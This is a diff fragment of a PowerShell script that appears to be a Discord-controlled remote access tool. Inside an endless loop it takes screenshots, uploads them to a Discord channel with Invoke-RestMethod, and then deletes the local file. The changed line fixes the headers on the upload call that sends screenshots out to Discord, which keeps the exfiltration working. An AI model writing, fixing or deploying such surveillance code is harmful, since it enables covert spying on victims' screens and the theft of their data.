@@ -83,7 +83,7 @@ while ($true) {
                 $path = Get-Screenshot
                 if ($path) {
                     Send-DiscordMessage -channelID $channel.id -content "Screenshot taken:" 
-                    Invoke-RestMethod -Uri "$baseUrl/channels/$($channel.id)/messages" -Method Post -Headers $headers -InFile $path -ContentType "multipart/form-data"
+                    Invoke-RestMethod -Uri "$baseUrl/channels/$($channel.id)/messages" -Method Post -Headers $fileheaders -InFile $path -ContentType "multipart/form-data"
                     Remove-Item -Path $path
                 } else {
                     Send-DiscordMessage -channelID $channel.id -content "Failed to take screenshot."
